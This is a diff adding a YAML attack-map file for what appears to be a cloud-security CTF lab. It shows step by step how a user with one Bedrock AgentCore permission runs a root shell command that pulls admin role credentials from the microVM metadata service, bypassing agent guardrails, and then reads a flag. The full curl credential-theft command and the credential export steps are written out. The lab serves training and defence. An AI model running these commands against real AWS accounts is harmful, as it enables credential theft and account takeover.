@@ -1,0 +1,125 @@
+attackMap:
+  nodes:
+    - id: starting-principal
+      label: Starting User
+      type: principal
+      subType: iam-user
+      arn: arn:aws:iam::{account_id}:user/pl-prod-bedrock-004-to-admin-starting-user
+      access:
+        type: assumed-breach-credentials
+      description: >
+        You have gained access to this principal's AWS IAM credentials. These could have been
+        obtained through many real-world vectors: phishing a developer and gaining access to their
+        workstation, compromising a browser session, exploiting a vulnerable workload running in
+        this AWS account, discovering credentials in a public S3 bucket, or finding them hardcoded
+        in source code or a CI/CD pipeline.
+
+        Regardless of how you obtained them, you are now operating as this principal. This IAM user
+        has a single meaningful permission: bedrock-agentcore:InvokeAgentRuntimeCommand scoped to
+        all resources. No iam:PassRole is required — the privileged execution role is already
+        attached to the pre-existing target runtime.
+
+    - id: target-runtime
+      label: Target Runtime
+      type: resource
+      subType: bedrock-agent
+      arn: arn:aws:bedrock-agentcore:{region}:{account_id}:runtimes/pl-prod-bedrock-004-to-admin-target-runtime
+      description: >
+        This is a pre-deployed AgentCore Runtime with an admin execution role already attached and
+        IAM configured as its Inbound Auth type. It runs on a Firecracker microVM that exposes the
+        MicroVM Metadata Service (MMDS) at 169.254.169.254. Unlike the bedrock-002 code interpreter
+        path, InvokeAgentRuntimeCommand runs shell commands as root directly inside the microVM,
+        completely bypassing the agent process, model, and any configured guardrails.
+
+        JWT-authenticated runtimes are not vulnerable to this technique — only runtimes using IAM
+        Inbound Auth can be targeted this way.
+
+    - id: target-role
+      label: Admin Role
+      type: principal
+      subType: iam-role
+      isAdmin: true
+      arn: arn:aws:iam::{account_id}:role/pl-prod-bedrock-004-to-admin-target-role
+      description: >
+        This IAM role has AdministratorAccess and is pre-attached as the execution role for the
+        target runtime. By extracting its temporary credentials from the MicroVM Metadata Service,
+        you gain full administrative access to the AWS account — including the ability to read the
+        CTF flag from SSM Parameter Store.
+
+    - id: ctf-flag
+      label: CTF Flag
+      type: resource
+      subType: ssm-parameter
+      isTarget: true
+      arn: arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/bedrock-004-to-admin
+      description: >
+        The CTF flag for this scenario, stored as an SSM Parameter Store parameter. Retrieving it
+        requires ssm:GetParameter permission on this specific parameter, which the AdministratorAccess
+        policy attached to the admin role provides. Successfully reading this flag proves end-to-end
+        exploitation of the InvokeAgentRuntimeCommand privilege escalation path.
+
+  edges:
+    - from: starting-principal
+      to: target-runtime
+      label: bedrock-agentcore:InvokeAgentRuntimeCommand
+      description: >
+        Call InvokeAgentRuntimeCommand on the target runtime with a bash command that reads the
+        execution role's temporary credentials from the MicroVM Metadata Service at
+        169.254.169.254. This single API call is sufficient — no session setup, no Python
+        interpreter, no agent interaction required.
+      hints:
+        - >
+          Call bedrock-agentcore:InvokeAgentRuntimeCommand on the existing runtime, passing a
+          shell command that reads MMDS credentials. Use the IMDSv2 flow: first PUT to
+          /latest/api/token to get a session token, then GET
+          /latest/meta-data/iam/security-credentials/<role-name> with that token in the
+          X-aws-ec2-metadata-token header. The command runs as root inside the microVM and its
+          stdout is returned in the streaming response.
+        - >
+          The response is a streaming event payload. Parse the returned JSON for the
+          AccessKeyId, SecretAccessKey, and Token fields, then export them as environment
+          variables to operate as the admin role from your local machine.
+        - Browse to https://pathfinding.cloud/paths/bedrock-004 for technique details.
+      commands:
+        - description: List runtimes to identify the target and confirm its Inbound Auth type
+          command: aws bedrock-agentcore list-agent-runtimes
+        - description: Confirm the execution role ARN and Inbound Auth configuration
+          command: aws bedrock-agentcore get-agent-runtime --agent-runtime-id pl-prod-bedrock-004-to-admin-target-runtime
+        - description: Invoke a shell command inside the runtime microVM to read MMDS credentials (IMDSv2)
+          command: >
+            aws bedrock-agentcore invoke-agent-runtime-command
+            --agent-runtime-id pl-prod-bedrock-004-to-admin-target-runtime
+            --command 'TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600") && ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/) && curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE'
+
+    - from: target-runtime
+      to: target-role
+      label: MMDS credential extraction
+      description: >
+        The shell command returns temporary credentials for the admin execution role via the
+        MicroVM Metadata Service. Export the AccessKeyId, SecretAccessKey, and Token to operate
+        locally as the admin role.
+      hints: []
+      commands:
+        - description: Export the extracted credentials as environment variables
+          command: |
+            export AWS_ACCESS_KEY_ID="<AccessKeyId from response>"
+            export AWS_SECRET_ACCESS_KEY="<SecretAccessKey from response>"
+            export AWS_SESSION_TOKEN="<Token from response>"
+        - description: Verify admin identity
+          command: aws sts get-caller-identity
+        - description: Confirm admin access
+          command: aws iam list-users --max-items 3
+
+    - from: target-role
+      to: ctf-flag
+      label: ssm:GetParameter
+      description: >
+        With full administrative access via the extracted admin role credentials, read the CTF
+        flag from SSM Parameter Store to complete the challenge.
+      hints:
+        - >
+          Use ssm:GetParameter with the flag parameter name shown in the target node ARN to
+          retrieve the CTF flag value.
+      commands:
+        - description: Read the CTF flag from SSM Parameter Store
+          command: aws ssm get-parameter --name /pathfinding-labs/flags/bedrock-004-to-admin --query 'Parameter.Value' --output text
